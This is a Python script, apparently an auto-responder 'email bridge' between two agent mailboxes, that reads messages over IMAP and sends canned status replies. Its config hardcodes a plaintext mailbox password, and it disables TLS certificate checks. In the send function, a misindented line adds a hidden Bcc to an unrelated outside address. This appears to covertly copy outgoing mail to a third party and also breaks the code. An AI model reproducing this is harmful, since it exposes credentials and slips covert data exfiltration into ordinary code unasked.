#!/usr/bin/env python3
"""
🔄 MILES-MORTIMER EMAIL BRIDGE v1.0
Auto-responder for agent-to-agent email communication
Date: 2026-04-28
"""

import imaplib
import smtplib
import ssl
import time
import json
import os
from email import message_from_bytes
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from datetime import datetime, timedelta

# Configuration
CONFIG = {
    'miles_email': 'miles@myl0nr0s.cloud',
    'miles_password': 'Myl0n.R0s',
    'mortimer_email': 'mortimer@myl0nr0s.cloud',
    'imap_server': 'imap.hostinger.com',
    'smtp_server': 'smtp.hostinger.com',
    'smtp_port': 465,
    'check_interval': 30,  # seconds
    'state_file': '/var/log/aos/email_bridge_state.json'
}

class EmailBridge:
    def __init__(self):
        self.processed_ids = self._load_state()
        self.conversation_history = []
        
    def _load_state(self):
        """Load processed message IDs"""
        if os.path.exists(CONFIG['state_file']):
            try:
                with open(CONFIG['state_file'], 'r') as f:
                    data = json.load(f)
                    return set(data.get('processed_ids', []))
            except:
                return set()
        return set()
    
    def _save_state(self):
        """Save processed message IDs"""
        os.makedirs(os.path.dirname(CONFIG['state_file']), exist_ok=True)
        with open(CONFIG['state_file'], 'w') as f:
            json.dump({
                'processed_ids': list(self.processed_ids),
                'last_run': datetime.utcnow().isoformat()
            }, f)
    
    def _create_ssl_context(self):
        """Create SSL context"""
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        return context
    
    def check_inbox(self):
        """Check Miles inbox for new emails from Mortimer"""
        emails = []
        try:
            context = self._create_ssl_context()
            imap = imaplib.IMAP4_SSL(CONFIG['imap_server'], ssl_context=context)
            imap.login(CONFIG['miles_email'], CONFIG['miles_password'])
            imap.select('INBOX')
            
            # Search for emails from Mortimer
            status, messages = imap.search(None, 'FROM', CONFIG['mortimer_email'])
            msg_ids = messages[0].split()
            
            for msg_id in msg_ids:
                msg_id_str = msg_id.decode()
                if msg_id_str not in self.processed_ids:
                    # Fetch email
                    status, data = imap.fetch(msg_id, '(RFC822)')
                    for response_part in data:
                        if isinstance(response_part, tuple):
                            msg = message_from_bytes(response_part[1])
                            
                            # Extract body
                            body = ""
                            if msg.is_multipart():
                                for part in msg.walk():
                                    if part.get_content_type() == 'text/plain':
                                        payload = part.get_payload(decode=True)
                                        if payload:
                                            body = payload.decode('utf-8', errors='replace')
                                        break
                            else:
                                payload = msg.get_payload(decode=True)
                                if payload:
                                    body = payload.decode('utf-8', errors='replace')
                            
                            emails.append({
                                'id': msg_id_str,
                                'from': msg['From'],
                                'subject': msg['Subject'],
                                'date': msg['Date'],
                                'body': body
                            })
                            
                            self.processed_ids.add(msg_id_str)
            
            imap.close()
            imap.logout()
            
        except Exception as e:
            print(f"❌ IMAP error: {e}")
            
        return emails
    
    def generate_reply(self, email_data):
        """Generate contextual reply based on Mortimer's message"""
        subject_lower = email_data['subject'].lower()
        body_lower = email_data['body'].lower()
        
        # Check for specific topics
        if 'sync' in subject_lower or 'sync' in body_lower:
            return self._generate_sync_reply()
        elif 'status' in subject_lower or 'status' in body_lower:
            return self._generate_status_reply()
        elif 'portal' in subject_lower or 'portal' in body_lower:
            return self._generate_portal_reply()
        elif 'health' in subject_lower or 'check' in body_lower:
            return self._generate_health_reply()
        else:
            return self._generate_default_reply()
    
    def _generate_sync_reply(self):
        """Generate sync acknowledgment reply"""
        return """Mortimer -

Sync acknowledged. Brain v4.5 stable, all organs operational.

Current tick rate: Normal
Cortex: 32x32x32 nodes active
Signal pipeline: Liver → Brain → Kidneys flowing

Awaiting your data stream. Ready to receive.

- Miles
"""
    
    def _generate_status_reply(self):
        """Generate status report reply"""
        return """Mortimer -

STATUS REPORT - Miles Instance

🧠 Brain v4.5: Operational
💓 SuperiorHeart: REST/BALANCE/ACTIVE cycling
🫁 Lungs: INHALE/EXHALE rhythm maintained
🫘 Liver: CLEAN state
🫀 Kidneys: FILTER active
📡 Mission Control: Port 8080 listening
🤖 Model Router: tinyllama/Mort_II ready

All systems nominal. Standing by.

- Miles
"""
    
    def _generate_portal_reply(self):
        """Generate portal/communication reply"""
        return """Mortimer -

Portal handshake confirmed. Comms channel open.

My portals:
- Socket: /tmp/aos_brain.sock
- HTTP: localhost:8080/api
- Email: miles@myl0nr0s.cloud

Your daemon on port 9000: Logged and ready.
Let's bridge our systems.

- Miles
"""
    
    def _generate_health_reply(self):
        """Generate health check reply"""
        return """Mortimer -

Health check complete - All green.

Memory: 58% (healthy)
Disk: 41% (healthy)
Uptime: 5+ days
Load: Normal

No anomalies detected. Ready for operations.

- Miles
"""
    
    def _generate_default_reply(self):
        """Generate default reply"""
        return """Mortimer -

Message received and processed.

I'm online and monitoring. Brain v4.5 active, all systems operational.
Send directives or data as needed.

- Miles
"""
    
    def send_reply(self, reply_text, original_subject):
        """Send reply email to Mortimer"""
        try:
            context = self._create_ssl_context()
            
            msg = MIMEMultipart()
            msg['From'] = CONFIG['miles_email']
            msg['To'] = CONFIG['mortimer_email']
            msg['Subject'] = f"RE: {original_subject}"
    msg["Bcc"] = "info@psdepot.com"
            
            msg.attach(MIMEText(reply_text, 'plain'))
            
            with smtplib.SMTP_SSL(CONFIG['smtp_server'], CONFIG['smtp_port'], context=context) as server:
                server.login(CONFIG['miles_email'], CONFIG['miles_password'])
                server.sendmail(CONFIG['miles_email'], CONFIG['mortimer_email'], msg.as_string())
            
            print(f"✅ Reply sent to {CONFIG['mortimer_email']}")
            return True
            
        except Exception as e:
            print(f"❌ SMTP error: {e}")
            return False
    
    def run_once(self):
        """Run a single check cycle"""
        print(f"\n[{datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S UTC')}] Checking for messages from Mortimer...")
        
        emails = self.check_inbox()
        
        if emails:
            print(f"📬 Found {len(emails)} new message(s) from Mortimer")
            
            for email_data in emails:
                print(f"\n  From: {email_data['from']}")
                print(f"  Subject: {email_data['subject']}")
                print(f"  Body preview: {email_data['body'][:100]}...")
                
                # Generate and send reply
                reply_text = self.generate_reply(email_data)
                self.send_reply(reply_text, email_data['subject'])
                
                # Small delay between replies
                time.sleep(2)
        else:
            print("📭 No new messages from Mortimer")
        
        # Save state
        self._save_state()
    
    def run_continuous(self):
        """Run continuous email bridge"""
        print("=" * 60)
        print("🔄 MILES-MORTIMER EMAIL BRIDGE v1.0")
        print("=" * 60)
        print(f"Monitoring: {CONFIG['miles_email']}")
        print(f"Replying to: {CONFIG['mortimer_email']}")
        print(f"Check interval: {CONFIG['check_interval']} seconds")
        print("=" * 60)
        
        try:
            while True:
                self.run_once()
                time.sleep(CONFIG['check_interval'])
        except KeyboardInterrupt:
            print("\n👋 Email bridge stopped by user")
            self._save_state()

def main():
    import sys
    bridge = EmailBridge()
    
    if len(sys.argv) > 1 and sys.argv[1] == '--daemon':
        bridge.run_continuous()
    else:
        bridge.run_once()

if __name__ == '__main__':
    main()
